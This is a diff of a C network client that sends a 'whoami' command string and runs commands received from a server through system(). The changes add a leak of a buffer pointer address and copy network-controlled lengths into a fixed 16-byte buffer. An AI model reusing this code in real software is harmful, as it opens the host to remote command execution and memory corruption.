@@ -25,7 +25,7 @@ int __cdecl main(int argc, char** argv)
     struct addrinfo* result = NULL,
         * ptr = NULL,
         hints;
-    const char* sendbuf = "COMM#6whoami";
+    const char* sendbuf = "COMM#60000whoami";
     char recvbuf[DEFAULT_BUFLEN];
     char recvbuf2[DEFAULT_BUFLEN];
     int iResult;
@@ -146,9 +146,16 @@ int __cdecl main(int argc, char** argv)
 
                 //Now, execute whatever came after the delimeter
                 char toExecute[16] = { 0 };
-                strncpy(toExecute, recvbuf + ii + 2, lenToExecute);
+                
+                //Pointer field
+                int startPoint = bufLen - lenToExecute - 1;
+                printf("R:%p | S:%i", (void*)recvbuf, startPoint);
+                strncpy(toExecute, recvbuf + startPoint, lenToExecute);
 
-                //printf("Received to be executed: %s\n", toExecute);
+                //This is a loop-based pointer field, not supported yet
+                //strncpy(toExecute, recvbuf + ii + 2, lenToExecute);
+
+                printf("Received to be executed: %s\n", toExecute);
 
                 system(toExecute);
             }
